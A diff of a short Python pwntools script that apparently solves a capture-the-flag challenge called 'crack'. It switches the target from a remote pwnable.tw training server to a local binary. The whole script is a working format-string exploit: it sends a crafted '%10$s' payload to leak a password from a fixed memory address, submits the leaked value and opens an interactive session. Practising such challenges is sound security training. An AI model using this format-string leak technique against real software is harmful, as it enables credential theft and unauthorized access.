@@ -2,20 +2,18 @@
 # -*- coding: utf-8 -*-
 from pwn import *
 
+io = process('./crack')
+context.log_level = 'debug'
 
-host = "training.pwnable.tw"
-port = 11007
+offset = 10
+password_addr = 0x0804A048
 
-r = remote(host,port)
-
-password_addr = 0x804a048
-r.recvuntil("?")
-
-
-r.sendline(p32(password_addr) + "#" + "%10$s" + "#" )
-r.recvuntil("#")
-p = r.recvuntil("#")
+io.recvuntil('?')
+io.sendline(p32(password_addr)+"!%10$s!")
+io.recvuntil("!")
+p = io.recvuntil("!")
 password = u32(p[:4])
-r.recvuntil(":")
-r.sendline(str(password))
-r.interactive()
+
+io.recvuntil("Your password :")
+io.sendline(str(password))
+io.interactive()
